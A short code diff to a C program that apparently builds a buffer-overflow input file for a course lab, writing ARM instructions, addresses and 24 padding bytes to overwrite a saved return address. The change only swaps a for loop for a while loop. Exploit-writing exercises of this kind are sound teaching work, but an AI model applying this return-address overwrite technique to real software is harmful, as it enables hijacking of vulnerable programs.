@@ -5,6 +5,7 @@ int main(void) {
     FILE *dataAplus;
     unsigned int payloadAddress, printfAddress;
     unsigned int ldrInstr, blInstr;
+    int i = 0;
 
     /* Open the dataAplus file for writing */
     dataAplus = fopen("dataAplus", "w+");
@@ -33,8 +34,9 @@ int main(void) {
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
     
     /*Padding to fill buffer and reach the return address*/
-    for (int i = 0; i < 24; i++) {
+    while(i < 24) {
         putc('A', dataAplus);
+        i++;
     }
 
     /* write BSS address of ldr instruction to file */
